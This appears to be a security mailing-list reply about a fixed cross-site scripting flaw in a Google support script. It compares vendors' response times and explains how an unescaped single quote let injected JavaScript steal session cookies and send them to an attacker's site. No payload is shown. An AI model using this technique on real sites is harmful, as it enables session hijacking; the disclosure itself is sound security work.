Subject: Re: Universal XSS in all Google Services

This is much better than its competitor (Yxxxx! Inc).

We reported critical security bug to them twice. All lost to their spam quarantine. When they managed to get back to us, and white-listed our addresses, we sent the alert again, and a reminder after. We weren't sure if those two got through, but we haven't heard from them either.

Anyway, the bug was resolved (without due credit) in about a month or two.

This serves as a contrast to the prompt response that Google Security Team displayed.

Cheers

The vulnerability existed in Google’s Support Python Script where a malicious url is not sanitized for XSS character ‘ (single quote) before putting inside javascript variable logURL. As a result, it was possible to break the encapsulation of the var declaration and execute arbitary javascript commands on the main Google.com domain.

I was able to write javascript statements to steal the session cookies [since characters such as ' ; . ( ) / = + were still available] and send it to my evil website. See the example given below.

If you think Google took a long time in fixing this vulnerability, think again. This python script is used in a lot of places. Try this Google Dork to see the usage of this script in almost all Google Services.
